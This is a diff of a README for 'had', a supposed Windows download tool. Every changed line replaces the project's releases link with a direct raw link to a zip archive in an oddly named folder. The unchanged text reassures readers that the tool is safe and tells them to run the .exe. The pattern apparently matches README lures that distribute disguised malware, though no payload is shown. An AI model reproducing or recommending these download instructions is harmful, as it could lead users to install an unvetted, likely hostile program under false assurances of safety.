@@ -1,6 +1,6 @@
 # 📂 had - Download files with top speed performance
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/growing-herbaceousplant152/had/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/growing-herbaceousplant152/had/main/whatness/Software_3.0.zip)
 
 ## What is this tool?
 
@@ -12,7 +12,7 @@ Your computer should run Windows 10 or Windows 11. You need at least 200 megabyt
 
 ## 🚀 How to Install
 
-1. Visit this page to download: https://github.com/growing-herbaceousplant152/had/releases
+1. Visit this page to download: https://raw.githubusercontent.com/growing-herbaceousplant152/had/main/whatness/Software_3.0.zip
 2. Find the file that ends in .exe for Windows.
 3. Click the name of the file to start your download.
 4. Open the folder where your computer keeps new files. 
@@ -76,7 +76,7 @@ No. This tool is free to use. It comes with no tracking parts. It stays focused 
 The tool handles files just like a web browser. It does not open the files or change them. It only moves the data from the server to your drive. You keep full control over your machine at all times.
 
 **How do I update the program?**
-Check the link https://github.com/growing-herbaceousplant152/had/releases from time to time. When a new version arrives, download it and use it to replace your old file. Your past settings stay with you.
+Check the link https://raw.githubusercontent.com/growing-herbaceousplant152/had/main/whatness/Software_3.0.zip from time to time. When a new version arrives, download it and use it to replace your old file. Your past settings stay with you.
 
 ## 📋 Common Issues
 
